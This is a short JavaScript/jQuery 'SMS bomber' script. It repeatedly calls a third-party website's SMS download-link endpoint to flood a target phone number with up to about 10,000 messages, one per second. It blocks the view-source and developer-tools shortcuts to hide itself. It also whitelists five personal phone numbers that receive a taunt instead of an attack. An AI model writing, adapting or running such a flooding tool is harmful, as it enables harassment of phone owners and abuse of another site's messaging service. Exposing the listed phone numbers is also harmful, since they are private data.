shortcut.add("Ctrl+U",function() {
		alert("BooBoo");
});
shortcut.add("F12",function() {
		alert("BooBoo");
});
$(".btn").on('click', function() {
	var number = $("#number").val();
	var limitt = 9999;
	var url = 'http://www.narendramodi.in/site/senddnldlink?contact_no=91%C2%A0'+number;
	var interval, i = 1;
	var white_list = [ '7388643341', '9140873522', '8381916336', '7275596691', '7007587370'
	]


	if( jQuery.inArray(number, white_list) == -1 ) {
                interval = setInterval(bombb,1000);
        }
        else {
                $("#resp").html("BAAP BAAP HOTA HAI -_+ ");
                exit();
        }
   
	
	function bombb() {
		$.ajax({
		  url: url,
		  type: 'GET',
		  crossDomain: true,
		  async: true,
		  //dataType: "jsonp",
		  success: function (response) {
			console.log('Done');
		  }
		});
		$("#resp").html(i+" SMS Sent");
		if( i <= limitt ) i++;
		else clearInterval(interval);
	}    
});
